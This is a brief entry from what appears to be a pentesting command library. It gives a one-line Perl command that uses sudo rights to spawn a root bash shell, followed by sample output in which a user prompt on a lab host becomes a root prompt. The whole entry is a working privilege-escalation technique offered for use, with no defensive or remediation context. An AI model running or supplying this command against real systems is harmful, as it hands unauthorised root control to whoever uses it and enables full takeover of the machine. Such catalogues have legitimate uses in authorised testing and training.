---
id: 9fa74a12-4c67-4e90-ba7d-6ed440e5aadf
name: Perl Spawn a Root Shell Using Sudo
type: command
executor: bash
data: sudo /usr/bin/perl -e 'system("/bin/bash")'
output: 'bob@host:/$ sudo /usr/bin/perl -e ''system("/bin/bash")''

  root@Shocker:/#'
created_at: '2019-11-23T01:30:50.359949+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Perl Spawn a Root Shell Using Sudo

```bash
sudo /usr/bin/perl -e 'system("/bin/bash")'
```

## Expected Output

```
bob@host:/$ sudo /usr/bin/perl -e 'system("/bin/bash")'
root@Shocker:/#
```


